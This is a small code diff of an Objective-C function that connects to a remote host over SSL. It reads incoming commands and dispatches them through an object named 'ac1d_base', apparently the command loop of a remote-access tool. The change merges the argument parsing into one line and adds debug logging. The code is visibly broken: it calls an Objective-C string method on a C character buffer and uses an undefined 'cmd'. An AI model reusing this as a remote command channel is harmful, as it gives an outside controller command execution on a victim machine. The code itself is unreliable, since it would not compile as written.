@@ -47,9 +47,11 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     
     char buffer[2048] = "";
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
-        NSArray *args = [buffer componentsSeparatedByString:@" "];
-        NSMutableArray *args_data = [NSMutableArray arrayWithArray:args_container];
+        NSMutableArray *args = [NSMutableArray arrayWithArray:[buffer componentsSeparatedByString:@" "]];
         
+        for (NSString *string in args) {
+            NSLog(@"%@", string);
+        }
         printf("%s", buffer);
         
         if ([commands containsObject:cmd]) [ac1d_base send_command:args];
